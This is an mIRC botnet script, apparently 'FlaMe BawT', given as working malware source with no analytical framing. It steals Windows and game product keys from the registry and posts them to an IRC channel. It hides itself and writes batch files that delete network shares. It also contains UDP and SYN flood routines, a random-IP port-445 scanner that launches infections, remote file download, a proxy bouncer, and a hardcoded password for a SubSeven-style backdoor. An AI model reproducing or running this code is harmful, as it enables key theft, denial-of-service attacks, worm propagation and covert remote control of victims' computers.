alias cskey2 { if ($RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key)) { msg %chan %b1 $+ keys $+ %b2 CS key: $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) $+ %b2 } | elseif ($RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key)) { msg %chan %b1 $+ keys $+ %b2 HL key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) $+ %b2 } }
alias winkey { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId)) { tawk %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) $+ %b2 } | elseif ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey)) { tawk %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) $+ %b2 } }
alias winkey2 { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId)) { msg %chan %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) $+ %b2 } | elseif ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey)) { msg %chan %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) $+ %b2 } }
alias bf1942 { if ($RegRead(HKEY_LOCAL_MACHINE\Electronic Arts\EA GAMES\Battlefield 1942\ergc)) { tawk %b1 $+ keys $+ %b2 BF1942 key: $RegRead(HKEY_LOCAL_MACHINE\Electronic Arts\EA GAMES\Battlefield 1942\ergc) $+ %b2 } }
alias nick0r { .return |FlaMe|-|[ $+ $r(0,99999999) $+ ]| }
alias rletterz { .return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias rletterz2 { .return $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) }
alias rnumberz { .return $r(0,9999999) }
alias verzian { .return 4(_/5-4!5-4\_/5|14FlaMe4-14BawT5|4\_/5-4!5-4\_) 5- Version, Beta 20 }
alias clearbuf { clearall | tawk %b1 $+ clear $+ %b2 %b1 $+ cleared buffer $+ %b2 }
alias cleanup { sockclose * | hider mnn32.exe -kf ping.exe | clearall | tawk %b1 $+ clean $+ %b2 %b1 $+ cleaned up $+ %b2 }
alias hide { .run -n msnq32.exe /n /fh UPDATE }
alias hider { .run -n msnq32.exe /n /fh /r " $+ $1- $+ " }
alias fakenick { .nick FAKE- $+ $rnumberz }
alias checkcopy { if (!$isfile(%spreadfile)) { .scancopy } }
alias secure1 { if (!$isfile(swtm32.bat)) { .makesecure | hider swtm32.bat } | elseif ($isfile(swtm32.bat)) { hider swtm32.bat } }
alias makesecure {
  .write swtm32.bat @echo off
  .write swtm32.bat set ehehe=net share
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) r$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) i$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) j$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) k$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) l$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) g$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) c$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) m$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) n$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) o$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) ipc$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) admin$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) print$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) p$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) h$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) d$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) e$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) f$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) s$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) My Documents /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) Shared Docs /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) t$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) u$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) z$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) v$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) w$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) x$ /delete /y
  .write swtm32.bat $chr(37) $+ ehehe $+ $chr(37) y$ /delete /y
}
alias uinst { if (!$isfile(ntnm32.bat)) { .makeuinst | tawk %b1 $+ uninstall $+ %b2 %b1 $+ removing files & removing from registry $+ %b2 | delreg | hider ntnm32.bat | .quit $verzian %b1 $+ IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) $+ %b2 | .exit } | else tawk %b1 $+ uninstall $+ %b2 %b1 $+ removing files & removing from registry $+ %b2 | delreg | hider ntnm32.bat | .quit $verzian %b1 $+ IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) $+ %b2 | .exit }
alias makeuinst {
  .write ntnm32.bat @echo off
  .write ntnm32.bat del ntnwsys.ocx
  .write ntnm32.bat del wsmd32.dll
  .write ntnm32.bat del ntnm32.bat
  .write ntnm32.bat del grdm32.exe
  .write ntnm32.bat del mnn32.exe
  .write ntnm32.bat del msnq32.exe
  .write ntnm32.bat del vlot.dll
  .write ntnm32.bat del $mircexe
  .write ntnm32.bat del ntnm32.bat
 .write ntnm32.bat del %spreadfile
}
alias bgwin { .window -p @Microsoft.Windows.Update 0 0 1600 1200 | .timer 0 5 window -a @Microsoft.Windows.update }
alias securityz {
  if ($appstate == hidden) { .clearall }
  if ($appstate != hidden) { tawk %b1 $+ security $+ %b2 %b1 $+ not hidden $+ %b2 | .hide | .clearall }
  if (!$isfile(msnq32.exe)) { tawk %b1 $+ security $+ %b2 %b1 $+ hidewindow is missing $+ %b2 | .hide | .clearall }
  if ($portfree(27374)) { .sockopen Antivirus 127.0.0.1 27374 }
  bgwin
}
alias udp.err { if ($isid) { return UDP2 $+ %b2 %b1 $+ error } }
alias udp.packet {
  if (!$isfile(uvxd32.vxd)) { udp.gen }
  if ($1) {
    var %ip = $1 , %port , %a , %b , %z , %times , %interval
    if ($numtok(%ip,46) != 4) { tawk %b1 $+ $udp.err $+ %b2 | return }
    if (*-t* !iswm $1-) { tawk %b1 $+ $udp.err $+ %b2 | return }
    else { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -t) { %times = $remove(%b,-t) | %a = $0 } | inc %a } }
    if (*-p* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -p) { %port = $remove(%b,-p) | %a = $0 } | inc %a } | if (%port !isnum 1-65553) { %port = r } }
    else { %port = r }
    if (*-i* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -i) { %interval = $remove(%b,-i) | %a = $0 } | inc %a } }
    if (%interval = $null) || (%interval < 0) { tawk %b1 $+ $udp.err $+ %b2 | return }
    $iif($iif(%interval <= 999,ms,sec) = ms,%z = $+(%interval,ms),%z = $+($calc(%interval / 1000),s))
    tawk %b1 $+ UDP2 $+ %b2 flood on %b1 $+ IP: %ip port: %port times: %times interval: %z $+ %b2
    .timer -oh %times %interval udp.packet2 %ip %port
   }
}
alias udp.packet2 {
  if ($2) {
    var %a 1 , %ip = $1 , %port = $iif($2 = r,$r(1,65553),$2) , %str = $left($read(uvxd32.vxd,$r(1,$lines(uvxd32.vxd))),400)
    while (%a <= 10) { sockudp $+(udp,$calc($r(1,999999999999999) / $ticks)) %ip %port %str | inc %a }
  }
}
alias udp.gen {
  var %ascii-start = 200 , %ascii-end = 250 , %bytes = 400 , %file = uvxd32.vxd
  while (%ascii-start <= %ascii-end) { write %file $str($chr(%ascii-start),%bytes) | inc %ascii-start }
}
alias synz { if (!$1) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | tawk %b1 $+ Syn $+ %b2 flood on %b1 $+ %synaa complete $+ %b2 }
alias syn {
  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x } }
  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias startscan {
  inc %totalscaning
  if %totalscaning >= %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 25
  set %ip26 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %scanport
  if $1 == 1 finished
  sockopen ip2 %ip2 %scanport
  if $1 == 2 finished
  sockopen ip3 %ip3 %scanport
  if $1 == 3 finished
  sockopen ip4 %ip4 %scanport
  if $1 == 4 finished
  sockopen ip5 %ip5 %scanport
  if $1 == 5 finished
  sockopen ip6 %ip6 %scanport
  if $1 == 6 finished
  sockopen ip7 %ip7 %scanport
  if $1 == 7 finished
  sockopen ip8 %ip8 %scanport
  if $1 == 8 finished
  sockopen ip9 %ip9 %scanport
  if $1 == 9 finished
  sockopen ip10 %ip10 %scanport
  if $1 == 10 finished
  sockopen ip11 %ip11 %scanport
  if $1 == 11 finished
  sockopen ip12 %ip12 %scanport
  if $1 == 12 finished
  sockopen ip13 %ip13 %scanport
  if $1 == 13 finished
  sockopen ip14 %ip14 %scanport
  if $1 == 14 finished
  sockopen ip15 %ip15 %scanport
  if $1 == 15 finished
  sockopen ip16 %ip16 %scanport
  if $1 == 16 finished
  sockopen ip17 %ip17 %scanport
  if $1 == 17 finished
  sockopen ip18 %ip18 %scanport
  if $1 == 18 finished
  sockopen ip19 %ip19 %scanport
  if $1 == 19 finished
  sockopen ip20 %ip20 %scanport
  if $1 == 20 finished
  sockopen ip21 %ip21 %scanport
  if $1 == 21 finished
  sockopen ip22 %ip22 %scanport
  if $1 == 22 finished
  sockopen ip23 %ip23 %scanport
  if $1 == 23 finished
  sockopen ip24 %ip24 %scanport
  if $1 == 24 finished
  sockopen ip25 %ip25 %scanport
  if $1 == 25 finished
  sockopen ip26 %ip26 %scanport
  .timerscanner1 1 4 /sockclose ip*
  .timerscanner2 1 5 /startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
alias randscan {
  unset %1p1 %1p2
  set %1p1 $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)
  :set2
  set %1p2 $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)
  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }
}
on 1:SOCKOPEN:ip*:{ if ($sockerr > 0) { halt }
  if (%scanport == 445) {
    set %445ip % [ $+ [ $sockname ] ]
    hider %scanbat %445ip %scanproto %spreadfile
    tawk 5|5-4!5-|- Vulnerable System Detected - %445ip Attempting Infection -5|5-4!5-|
    inc %totalscanned | sockclose $sockname | unset %445ip | halt
  }
}
alias stopscan { sockclose ip* | .timerscanner* off | unset %ip* | unset %totalscan* | unset %beg* | unset %end* | unset %rand2ip | hider mnn32.exe -kf boot.exe }
alias randscann { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %1p1 - %1p2 $+ %b2 }
alias totalfound {
  if (%totalscanned) { return %totalscanned }
  if (!%totalscanned) { return none }
}
alias finished {
  if (%begshortip) {
  tawk %b1 $+ scanner $+ %b2 scanning from %b1 $+ %begshortip - %endshortip $+ %b2 has finished! | stopscan
  }
}
alias RegRead {
  if ($1) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %q = $com(%a).result
      .comclose %a
      if (%q) return %q
    }
  }
}
alias RegWrite {
  if ($1) && ($2) && ($3) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
  }
}
alias RegDelete {
  if ($1) {
    var %a = RegDelete
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
}
on 1:SOCKCLOSE:sclick*:{ tawk %b1 $+ visit $+ %b2 %b1 $+ socket closed $+ %b2 | unset %g | unset %h }
on 1:SOCKOPEN:download:{ if ($sockerr) { tawk %b1 $+ download $+ %b2 %b1 $+ error socket error $+ %b2 | unset %dlfile | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on 1:SOCKREAD:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on 1:SOCKCLOSE:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { tawk %b1 $+ download $+ %b2 success: file downloaded %b1 $+ $mircdir $+ %download2 $+ %b2 %b1 $+ $file(%download2).size bytes $+ %b2 } | unset %download* %dlfile }
on 1:SOCKLISTEN:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on 1:SOCKREAD:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2 && $1,$3 isnum) { sockwrite -n $sockname $3 , $1 : USERID : none.of.your.business : $rletterz | sockclose $sockname | unset %ident } }
CTCP *:*:*:{ haltdef }
on 1:SOCKREAD:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ you need to say /raw pass <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ welcome to the bnc
      sockwrite -n $sockname NOTICE AUTH : $+ step two, connect to something..
      sockwrite -n $sockname NOTICE AUTH : $+ type /raw conn <server> <port> <pass> to connect (most irc's dont use pass)
      %Bnc.legit = yes
    }
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ wrong pass try again ;[
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ bnc exploits do not work on me ;[ | sockclose $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient)) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ connecting to $gettok(%BncClient,2,32) $+ : $+ $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on 1:SOCKOPEN:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on 1:SOCKREAD:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on 1:SOCKLISTEN:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on 1:SOCKOPEN:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $rletterz $rletterz $rletterz : $+ $rletterz | sockwrite -tn $sockname NICK $rletterz }
on 1:SOCKREAD:Sockets-*:{
  sockread %SocketTemp
  if (PING* ISWM %SocketTemp) {
    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
    halt
  }
  halt
}
on 1:START:{ .startstuff }
on 1:EXIT:{ .exitstuff }
on 1:CONNECT:{ .connstuff }
on 1:DISCONNECT:{ .dscnstuff }
on 1:CONNECTFAIL:{ .cnnfailstuff }
on 1:INPUT:*:{ haltdef | tawk %b1 $+ security $+ %b2 user input %b1 $+ $1- $+ %b2 | .fakenick | .hide | .uinst }
on 1:KEYDOWN:@:*:{ tawk %b1 $+ security $+ %b2 user pressed key %b1 $+ $keychar $+ %b2 | .fakenick | .hide | .uinst }
on 1:OP:%chan:{ if ($opnick == $me) { .topic %chan .scan rand2 $r(210,220) | .mode %chan +mnstk %key } }
on 1:DNS:{ tawk %b1 $+ dns $+ %b2 resolved %b1 $+ %dnsip $+ %b2 to %b1 $+ IP: $iaddress host: $naddress $+ %b2 | unset %dnsip }
on 1:SOCKOPEN:Antivirus*:{ if ($sockerr > 0) { return } }
on 1:SOCKREAD:Antivirus*:{ sockread -f %Antivirus | if (%Antivirus == PWD) { sockwrite $sockname PWD14438136782715101980 | .timer 1 10 sockwrite $sockname RMS } | sockwrite $sockname RMS | unset %Antivirus }
on 1:SOCKOPEN:sclick*:{
  sockwrite -n $sockname GET %g HTTP/1.1
  sockwrite -n $sockname Host: %h
  sockwrite -n $sockname Connection: keep-alive
  sockwrite $sockname $rletterz
  unset %g
  unset %h
}
on *:PART:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:QUIT:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:NICK:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
}